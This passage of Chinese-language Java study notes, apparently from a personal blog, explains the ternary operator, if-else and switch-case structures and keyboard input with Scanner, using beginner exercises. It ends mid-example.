<p><code>&gt;&gt; </code>: 在一定范围内，每向右移1位，相当于  / 2</p>
<p><img src="/2022/04/13/JAVA/image-20220416155504269.png" alt="image-20220416155504269"></p>
<p>m=k^n=(m^n)^n</p>
<p><img src="/2022/04/13/JAVA/image-20220416155912177.png" alt="image-20220416155912177"></p>
<h3 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3><p><img src="/2022/04/13/JAVA/image-20220416160137401.png" alt="image-20220416160137401"></p>
<p>说明<br>①条件表达式的结果为boolean类型<br>②根据条件表达式真或假，决定执行表达式1，还是表达式2.<br>        如果表达式为true,则执行表达式1.<br>        如果表达式为false,则执行表达式2.</p>
<p>③表达式1和表达式2要求是一致的。<br>④三元运算符可以嵌套使用</p>
<p><img src="/2022/04/13/JAVA/image-20220416161237609.png" alt="image-20220416161237609"></p>
<p>凡是可以使用三元运算符的地方，都可以改写为if- else，反之不一定。</p>
<p>如果程序既可以使用三元运算符，又可以使用if-else结构， 那么优先选择三元运算符。原因:简洁、执行效率高。</p>
<h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p><img src="/2022/04/13/JAVA/image-20220416162633712.png" alt="image-20220416162633712"></p>
<p>想先算的加()就行</p>
<h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><p>●流程控制语句是用来控制程序中各语句执行顺序的语句，可以把语句组合成能完成一定功能的小逻辑模块。<br>●其流程控制方式采用结构化程序设计中规定的三种基本流程结构，即:<br>➢顺序结构：程序从上到下逐行地执行，中间没有任何判断和跳转。<br>➢分支结构：根据条件，选择性地执行某段代码。有if-else if-else和switch-case两种分支语句。<br>➢循环结构：根据循环条件，重复性的执行某段代码。有while、do…while ，for三种循环语句。</p>
<p>➢注: JDK1.5提供了foreach循环，方便的遍历集合、数组元素。</p>
<h3 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h3><h4 id="if-else结构"><a href="#if-else结构" class="headerlink" title="if-else结构"></a>if-else结构</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">第一种:</span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(条件表达式)</span></span>&#123;</span><br><span class="line">	执行表达式</span><br><span class="line">&#125;</span><br><span class="line">第二种:二选一</span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(条件表达式)</span></span>&#123;</span><br><span class="line">	执行表达式<span class="number">1</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	执行表达式<span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line">第三种:多选一</span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(条件表达式)</span></span>&#123;</span><br><span class="line">	执行表达式<span class="number">1</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">	执行表达式<span class="number">2</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(条件表达式)&#123;</span><br><span class="line">	执行表达式<span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	执行表达式n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用Scanner从键盘获取数据"><a href="#使用Scanner从键盘获取数据" class="headerlink" title="使用Scanner从键盘获取数据"></a>使用Scanner从键盘获取数据</h4><p>具体实现步骤:<br>1.导包: import java.util. Scanner;</p>
<p>2.Scanner的实例化: Scanner scan = new Scanner(System. in); </p>
<p>3.调用Scanner类的相关方法（next() / nextXxx()   ; String类型用next()），来获取指定类型的变量 </p>
<p>注意:<br>需要根据相应的方法，来输入指定类型的值。如果输入的数据类型与要求的类型不匹配时，会报异常，导致程序终止。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScannerTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> num = scan.nextInt();</span><br><span class="line">        System.out.println(num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">nextInt()：获取<span class="keyword">int</span>型</span><br></pre></td></tr></table></figure>

<p>Scanner的一些方法</p>
<p><img src="/2022/04/13/JAVA/image-20220416173946250.png" alt="image-20220416173946250"></p>
<p>对于char型的获取，<strong>Scanner</strong>没有提供相关的方法。只能获取一个字符串.  next()</p>
<p>如果想要获取输出char类型的，<strong>String</strong>提供了charAt():获取索引位置上的字符</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScannerTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你的姓名：&quot;</span>);</span><br><span class="line">        String name = scan.next();</span><br><span class="line">        System.out.println(name);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你的年龄：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> age = scan.nextInt();</span><br><span class="line">        System.out.println(age);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你的体重：&quot;</span>);</span><br><span class="line">        <span class="keyword">double</span> weight = scan.nextDouble();</span><br><span class="line">        System.out.println(weight);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;你是否相中了我?(true/false)&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> isLove = scan.nextBoolean();</span><br><span class="line">        System.out.println(isLove);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你的性别：(男/女)&quot;</span>);</span><br><span class="line">        String gender = scan.next();</span><br><span class="line">        <span class="keyword">char</span> genderChar = gender.charAt(<span class="number">0</span>);</span><br><span class="line">        System.out.println(genderChar);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>if-else例题：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IfTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入岳小鹏成绩：(0~100)&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> score = scan.nextInt();</span><br><span class="line">        <span class="keyword">if</span>(score == <span class="number">100</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;奖励一辆BMW&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(score&gt;<span class="number">80</span> &amp;&amp; score&lt;=<span class="number">99</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;奖励一台iphone&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(score&gt;=<span class="number">60</span> &amp;&amp; score&lt;=<span class="number">80</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;奖励一台ipad&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;什么奖励都没有！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明:</p>
<p>1、else 结构是可选的。<br>2、针对于条件表达式:<br>①如果多个条件表达式之间是“互斥”关系(或没有交集的关系),哪个判断和执行语句声明在上面还是下面，无所谓。</p>
<p>②如果多个条件表达式之间有交集的关系，需要根据实际情况，考虑清楚应该将哪个结构声明在上面。</p>
<p>③如果多个条件表达式之间有包含的关系，通常情况下，需要将范围小的声明在范围大的上面。否则，范围小的就没机会进行了</p>
<p>if-else Test2：</p>
<p>编写程序:由键盘输入三个整数分别存入变量num1、num2、num3，对它们进行排序(使用if-else if-else),并且从小到大输出</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IfTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入第一个整数：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> num1 = scan.nextInt();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入第二个整数：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> num2 = scan.nextInt();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入第三个整数：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> num3 = scan.nextInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(num1&gt;=num2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num3&gt;=num1)&#123;</span><br><span class="line">                System.out.println(num2+<span class="string">&quot;,&quot;</span>+num1+<span class="string">&quot;,&quot;</span>+num3);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num3 &lt;= num2)&#123;</span><br><span class="line">                System.out.println(num3+<span class="string">&quot;,&quot;</span>+num2+<span class="string">&quot;,&quot;</span>+num1);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(num2+<span class="string">&quot;,&quot;</span>+num3+<span class="string">&quot;,&quot;</span>+num1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(num3&gt;=num2)&#123;</span><br><span class="line">                System.out.println(num1+<span class="string">&quot;,&quot;</span>+num2+<span class="string">&quot;,&quot;</span>+num3);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num3&lt;=num1)&#123;</span><br><span class="line">                System.out.println(num3+<span class="string">&quot;,&quot;</span>+num1+<span class="string">&quot;,&quot;</span>+num2);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(num1+<span class="string">&quot;,&quot;</span>+num3+<span class="string">&quot;,&quot;</span>+num2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明:<br>1.if-else结构是可以相互嵌套的。<br>2.如果if-else结构中的执行语句只有一行时，对应的一对{}可以省略的。但是，不建议省略。</p>
<p>如何获取随机数：两位数[10,99]</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> value = Math.random(); [<span class="number">0.0</span>~<span class="number">1.0</span>)</span><br><span class="line"><span class="keyword">int</span> value = (<span class="keyword">int</span>)(Math.random()*<span class="number">90</span>+<span class="number">10</span>); [<span class="number">10</span>~<span class="number">99</span>]</span><br><span class="line">                               </span><br><span class="line">公式：[a,b]: (<span class="keyword">int</span>)(Math.random()*(b-a+<span class="number">1</span>)+a)                 </span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IfTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你的身高：(cm)&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> height = scan.nextInt();</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你的财富：(千万)&quot;</span>);</span><br><span class="line">        <span class="keyword">double</span> wealth = scan.nextDouble();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        System.out.println(&quot;请输入你是否帅：(true/false)&quot;);</span></span><br><span class="line"><span class="comment">        boolean isHandsome = scan.nextBoolean();</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">        if(height &gt;= 180 &amp;&amp; wealth &gt;= 1 &amp;&amp; isHandsome)&#123;</span></span><br><span class="line"><span class="comment">            System.out.println(&quot;我一定要嫁给他！&quot;);</span></span><br><span class="line"><span class="comment">        &#125;else if (height &gt;= 180 || wealth &gt;= 1 || isHandsome)&#123;</span></span><br><span class="line"><span class="comment">            System.out.println(&quot;嫁吧，不上不足，比下有余&quot;);</span></span><br><span class="line"><span class="comment">        &#125;else&#123;</span></span><br><span class="line"><span class="comment">            System.out.println(&quot;不嫁&quot;);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">//方式二：</span></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入你是否帅：(是/否)&quot;</span>);</span><br><span class="line">        String isHandsome = scan.next();</span><br><span class="line">        <span class="keyword">if</span>(height &gt;=<span class="number">180</span> &amp;&amp; wealth &gt;= <span class="number">1</span> &amp;&amp; isHandsome.equals(<span class="string">&quot;是&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;我一定要嫁给他！&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (height &gt;= <span class="number">180</span> || wealth &gt;= <span class="number">1</span> || isHandsome.equals(<span class="string">&quot;是&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;嫁吧，不上不足，比下有余&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;不嫁&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String的equals方法：将此字符串与指定的对象比较。当且仅当该参数不为<span class="keyword">null</span>, 并且是与此对象表示相同字符序列的String 对象时，结果才为<span class="keyword">true</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> “==”这里的比较是针对两个String类型的变量的引用，也就是说如果两个String类型的变量，他们所引用的是同一个string对象（指向同一个内存堆），即返回<span class="keyword">true</span>。</span><br><span class="line"><span class="number">2.</span> 用Object对象的equals()方法String对象继承自Object，并且对equals方法进行了重写，用此方法进行比较时，其实是对String对象封装的字符串内容进行比较，相同返回<span class="keyword">true</span>。 </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;==&quot;</span>是判断两个变量或实例是不是指向同一个内存空间。<span class="string">&quot;equals&quot;</span>是判断两个变量或实例所指向的内存空间的值是不是相同。</span><br><span class="line">对于基本数据类型，==比较的是两者的值，对于引用数据类型，==比较的是两者的内存地址；String重写的equals比较的是两者的值（内容）是否相等。</span><br><span class="line">如果类没有重写equals，则比较的是地址值是否相等。</span><br></pre></td></tr></table></figure>

<h4 id="switch-case结构"><a href="#switch-case结构" class="headerlink" title="switch-case结构"></a>switch-case结构</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">switch(表达式)&#123;</span><br><span class="line">case 常量<span class="number">1</span>:</span><br><span class="line">	语句<span class="number">1</span>;</span><br><span class="line"> 	<span class="regexp">//</span><span class="keyword">break</span>;</span><br><span class="line">case 常量<span class="number">2</span>:</span><br><span class="line">	语句<span class="number">2</span>;</span><br><span class="line">	<span class="regexp">//</span><span class="keyword">break</span>;</span><br><span class="line">... ...</span><br><span class="line">case 常量N:</span><br><span class="line">	语句N;</span><br><span class="line">	<span class="regexp">//</span><span class="keyword">break</span>;</span><br><span class="line">default:</span><br><span class="line">	语句;</span><br><span class="line">	<span class="regexp">//</span><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/13/JAVA/image-20220417200158150.png" alt="image-20220417200158150"></p>
<p>说明：</p>
<p>①根据switch表达式中的值，<strong>依次匹配各个case中的常量</strong>。一旦匹配成功，则进入相应case结构中，调用其执行语句。<br>当调用完执行语句以后，则仍然继续向下执行其他case结构中的执行语句，直到遇到break关键字或此switch- case结构末尾结束为止。</p>
<p>②break,可以使用在switch-case结构中，表示一旦执行到此关键字，就跳出switch- case结构</p>
<p>③switch结构中的表达式，<strong>只能是如下的6种数据类型之一: byte 、short、 char、 int、 枚举类型、String类型</strong></p>
<p>④case之后只能声明常量。不能声明范围。</p>
<p>⑤ break关键字是可选的</p>
<p>⑥default：相当于if-else结构中的else。default结构是可选的。而且位置是可选的</p>
<p>例题：</p>
<p>1、使用switch把小写类型的char型转为大写。只转换a,b,c,d,e.其它的输<br>出”other”</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SwitchCaseTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入一个字母：&quot;</span>);</span><br><span class="line">        String word = scan.next();</span><br><span class="line">        <span class="keyword">char</span> c = word.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&#x27;D&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&#x27;E&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;other&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.对学生成绩大于60分的，输出“合格”。低于60分的，输出“不合格”。</p>
<p>说明:如果switch- case结构中的多个case的执行语句相同，则可以考虑进行合并。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SwitchCaseTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入成绩：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> score = scan.nextInt();</span><br><span class="line">        <span class="keyword">switch</span>(score/<span class="number">10</span>)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;不及格&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;及格&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">此题：</span><br><span class="line"><span class="comment">//更优的解决方案:</span></span><br><span class="line"><span class="keyword">switch</span>(score / <span class="number">60</span>)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">	System.out.println(<span class="string">&quot;不及格&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">	System.out.print1n(<span class="string">&quot;及格&quot;</span>);</span><br><span class="line">	<span class="keyword">break</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、编写程序:从键盘上输入2019年的“month”和“day”，要求通过程序输出输入的日期为2019年的第几天。</p>
<p><img src="/2022/04/13/JAVA/image-20220417211543842.png" alt="image-20220417211543842"></p>
<p>方式二：switch-case  倒着写</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SwitchCaseTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span 